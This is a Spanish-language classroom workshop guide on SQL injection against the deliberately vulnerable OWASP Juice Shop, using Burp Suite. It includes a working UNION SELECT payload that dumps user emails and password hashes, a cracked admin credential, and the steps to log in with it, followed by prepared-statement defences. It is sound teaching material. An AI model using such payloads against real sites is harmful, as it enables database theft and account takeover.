# Guía del Taller: Explotación de Inyección SQL en OWASP Juice Shop

Esta guía acompaña al taller práctico de seguridad web y tiene como objetivo que el alumnado identifique, explote y comprenda una vulnerabilidad de **Inyección SQL** (SQL Injection) en un entorno controlado y diseñado para el aprendizaje: OWASP Juice Shop.


## Herramientas necesarias

- Docker
- OWASP Juice Shop (imagen Docker)
- Burp Suite Community Edition

## Paso 1: Preparación del entorno

### Conectarte a la aplicación vulnerable

Con la IP que te facilitaremos en la presentación te conectaras a la web.

### Configurar Burp Suite

1. Abrir Burp Suite
2. Acceder a la pestaña **Proxy**
3. Pulsar **Open Browser**
4. Utilizar únicamente este navegador durante el taller

## Paso 2: Detección de la vulnerabilidad

### Objetivo

Comprobar si el buscador de productos procesa directamente la entrada del usuario dentro de una consulta SQL.

### Procedimiento

1. En Juice Shop, utilizar la lupa de búsqueda
2. Introducir el texto: `apple`
3. En Burp Suite, ir a **Proxy** → **HTTP history**
4. Localizar la petición:
   ```
   GET /rest/products/search?q=apple
   ```
5. Clic derecho sobre la petición y seleccionar **Send to Repeater**
6. Acceder a la pestaña **Repeater**

### Prueba de Inyección SQL

Modificar el parámetro `q` por el siguiente valor:

```
q='
```

Enviar la petición.

**Resultado esperado:** Si la respuesta del servidor contiene un error del tipo:

```
SQLITE_ERROR
```
Se confirma que la aplicación es **vulnerable a Inyección SQL**.

---

## Paso 3: Explotación de la vulnerabilidad

### Objetivo

Extraer información de la tabla de usuarios utilizando una consulta **UNION SELECT**.

### Indicaciones

- La consulta original devuelve **9 columnas**
- Para que **UNION SELECT** funcione, el número de columnas debe coincidir
- Existe una tabla llamada **Users**
- Los campos de interés son **email** y **password**

### Tarea del alumnado

1. En la pestaña **Repeater**, borrar el contenido del parámetro `q=`
2. Construir una inyección SQL que permita:
   - Unir resultados de la tabla Users
   - Mostrar correos y contraseñas
3. Enviar la petición y analizar la respuesta JSON

---

## Paso 4: Análisis y descifrado de contraseñas

### Observación de resultados

En la respuesta del servidor:

- Los correos electrónicos aparecen en campos de productos
- Las contraseñas están almacenadas como hashes MD5

### Tarea

1. Copiar el hash del usuario administrador
2. Utilizar una herramienta de cracking de hashes (CrackStation.net)
3. Obtener la contraseña en texto plano
4. Acceder al login de Juice Shop con las credenciales obtenidas

---

## Medidas de defensa

### Reflexión

La Inyección SQL no es un fallo del lenguaje SQL, sino del **uso incorrecto de las entradas del usuario** en las consultas.

### Buenas prácticas de seguridad

- No concatenar datos del usuario en consultas SQL
- Utilizar consultas preparadas (Prepared Statements)
- Validar y sanear todas las entradas
- Aplicar el principio de mínimo privilegio en la base de datos

---

## Soluciones

### Payload funcional

```
apple'))+UNION+SELECT+1,2,3,4,email,password,7,8,9+FROM+Users--
```

### Ubicación de los datos en la respuesta

| Tipo de dato         | Campo       | Ejemplo                          |
| -------------------- | ----------- | -------------------------------- |
| Correos electrónicos | deluxePrice | admin@juice-sh.op                |
| Hashes de contraseña | image       | 0192023a7bbd73250516f069df18b500 |

### Resultado del cracking

**Contraseña del administrador:**

```
admin123
```

### Ejemplo de código vulnerable y seguro

**Código vulnerable:**

```java
String query = "SELECT * FROM Products WHERE q = '" + search + "'";
```

**Código seguro (consulta preparada):**

```java
String query = "SELECT * FROM Products WHERE q = ?";
PreparedStatement stmt = conn.prepareStatement(query);
stmt.setString(1, search);
```

---

## Conclusión

Este ejercicio demuestra cómo una única vulnerabilidad de **Inyección SQL** puede comprometer completamente una aplicación. La prevención depende de aplicar **buenas prácticas de desarrollo seguro** desde el inicio del proyecto .
